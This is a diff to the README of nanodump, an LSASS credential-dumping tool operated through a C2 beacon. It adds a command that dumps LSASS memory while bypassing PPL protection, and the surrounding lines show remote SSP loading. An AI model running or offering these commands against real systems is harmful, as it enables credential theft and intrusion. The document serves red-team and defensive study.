@@ -238,6 +238,11 @@ Load nanodump in LSASS as an SSP remotely:
 beacon> load_ssp \\10.10.10.10\openShare\nanodump_ssp.x64.dll
 ```
 
+Dump LSASS bypassing PPL, duplicating the handle that csrss.exe has on LSASS:
+```
+beacon> nanodump_ppl --dup --write C:\Windows\Temp\lsass.dmp
+```
+
 <h2 id="redirectors">12. HTTPS redirectors</h2>
 
 If you are using an HTTPS redirector (as you should), you might run into issues when downloading the dump filessly due to the size of the requests that leak the dump.  
